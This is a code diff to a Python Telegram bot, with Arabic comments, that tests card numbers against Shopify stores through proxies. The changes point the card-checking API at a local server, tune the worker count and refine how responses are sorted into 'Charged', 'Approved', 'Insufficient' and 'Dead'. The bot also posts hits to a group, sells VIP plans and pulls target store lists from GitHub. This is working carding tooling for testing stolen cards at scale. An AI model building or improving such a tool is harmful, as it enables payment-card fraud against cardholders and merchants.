@@ -84,12 +84,12 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# [تم التحديث] تركيب الـ API الجديد الفريش والمتوافق بالكامل على منصة Railway
-SHOPIFY_API_URL_1 = 'https://web-production-54ad4.up.railway.app/sh'
+# [تم التحديث] تركيب الـ API المحلي الجديد لضمان أعلى استقرار وسرعة فحص قصوى
+SHOPIFY_API_URL_1 = 'http://192.168.0.3:5000/sh'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
-WORKERS = 70  
+WORKERS = 25  
 DELAY = 1.6  
 HIT_DELAY = 1.0
 
@@ -208,7 +208,7 @@ ANIME_GIFS = [
     "https://i.giphy.com/l3vR1603ssT69vWb6.gif",        
     "https://i.giphy.com/XjY7D2H47Y0j6.gif",        
     "https://i.giphy.com/20K8866h4693G.gif",        
-    "https://i.giphy.com/ d3mlE7uhRoVX2Im4.gif"         
+    "https://i.giphy.com/d3mlE7uhRoVX2Im4.gif"         
 ]
 
 PLANS = {
@@ -549,18 +549,16 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# [تم التحديث والإصلاح الشامل لنظام السيرفر الجديد /sh لتنظيف هيكلة البروكسي وبناء معاملات الاستدعاء بشكل متوافق ومحمي]
+# [الحفاظ على التوافقية الكاملة] تنظيف البروكسيات وبناء المعاملات بما يتوافق 100% مع الـ API الجديد لحل مشكلة الـ Error كلياً
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         
-        # هندسة وتطهير صيغة البروكسي الحية وعزل بادئات البروتوكول (http:// أو socks5://) ليتطابق مع مواصفات الـ API الجديد
+        # هندسة وتصفية البروكسي وعزل البادئات المسببة لأخطاء الشبكة في السيرفر
         if proxy_str and "://" in proxy_str:
             proxy_str = proxy_str.split("://")[-1]
         
-        # ترميز وتشفير الفيزا بشكل آمن لمنع تدمير الرابط بسبب علامة الحصر |
         card_encoded = quote(str(card).strip())
-        
         site_param = site.strip()
         if not site_param.startswith("http"):
             site_param = f"https://{site_param}"
@@ -568,33 +566,35 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
         
-        # بناء مسار الاستدعاء المطابق والآمن 100% للسيرفر الجديد فريش
+        # بناء الرابط المشفر بالهيكلية الصارمة المطلوبة للسيرفر الجديد الخام (?cc=...&site=...&proxy=...)
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        async with session.get(req_url, headers=headers, timeout=10) as resp:
-            if resp.status in [405, 429, 502, 503, 504]:
-                return {'status': 'Rate Limit', 'message': f'HTTP Error {resp.status}', 'card': card, 'retry': True}
+        async with session.get(req_url, headers=headers, timeout=12) as resp:
+            if resp.status == 429:
+                return {'status': 'Rate Limit', 'message': 'API Rate Limited (429)', 'card': card, 'retry': True}
+            if resp.status in [502, 503, 504]:
+                return {'status': 'Site Error', 'message': f'Server Overloaded ({resp.status})', 'card': card, 'retry': True}
+            if resp.status != 200: 
+                return {'status': 'Site Error', 'message': f'API HTTP Status {resp.status}', 'card': card, 'retry': True}
                 
             text_data = await resp.text()
-            if resp.status != 200: 
-                return {'status': 'Site Error', 'message': f'HTTP Status {resp.status}', 'card': card, 'retry': True}
-                
             try: 
                 rj = json.loads(text_data)
             except Exception: 
                 tl = text_data.lower()
                 if "charged" in tl or "success" in tl:
                     return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
+                if "insufficient" in tl:
+                    return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
+                return {'status': 'Site Error', 'message': 'Invalid API JSON Response', 'card': card, 'retry': True}
             
         if not rj.get('status', True) and 'error' in rj:
             return {'status': 'Site Error', 'message': rj.get('error', 'API Blocked'), 'card': card, 'retry': True}
             
-        # استقراء الردود بمصفوفة مفاتيح موسعة لمنع اعتبار الردود الصحيحة كميتة عشوائياً
         rm = str(rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', ''))))))).strip()
         pr = rj.get('Price', rj.get('amount', "$10.00")) 
         gt = rj.get('Gateway', 'Shopify')
@@ -611,8 +611,10 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
             return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
         return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'Local Server Timeout', 'card': card, 'retry': True}
     except Exception as e: 
-        return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': f'Connection Drop: {str(e)[:18]}', 'card': card, 'retry': True}
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
@@ -714,7 +716,6 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
-# تم ضبط المعاملات وإزالة المتغير الزائد للحفاظ على دقة الاستدعاء
 async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global _MAINTENANCE_MODE
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
@@ -1051,7 +1052,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # [أمر حصري وخارق للآدمن فقط] جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
+    # [أمر حصري للآدمن] جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
     elif cmd == "checkgates":
         if uid not in ADMIN_ID: return
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching gates from GitHub...')}</b>", use_gif=True)
